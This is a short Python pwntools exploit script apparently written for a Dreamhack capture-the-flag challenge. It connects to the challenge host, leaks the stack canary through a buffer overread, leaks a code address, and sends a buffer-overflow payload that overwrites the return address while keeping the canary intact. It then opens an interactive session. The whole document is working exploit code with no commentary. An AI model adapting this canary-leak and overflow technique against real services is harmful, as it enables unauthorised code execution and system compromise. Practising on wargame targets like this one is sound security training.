from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 19605
r = remote(HOST, PORT)

r.sendafter(b': ', b'A'*7)
r.sendlineafter(b': ', b'1000')
r.recv(1001)
canary=u64(r.recv(7).ljust(8,b'\x00')) << 8

r.sendlineafter(b': ', b'\x00'*7)
r.sendlineafter(b': ', b'999')

r.sendlineafter(b': ', b'A'*43)
r.sendlineafter(b': ', b'1000')
leak=u64(r.recvline().strip()[-6:].ljust(8,b'\x00'))-0x12

payload=b'A'*52+p64(canary)+b'A'*8+p64(leak)+b'A'*3
r.sendlineafter(b': ', payload)
r.sendlineafter(b': ', b'1000')

r.sendlineafter(b': ', b'A')
r.sendlineafter(b': ', b'1001')

r.interactive()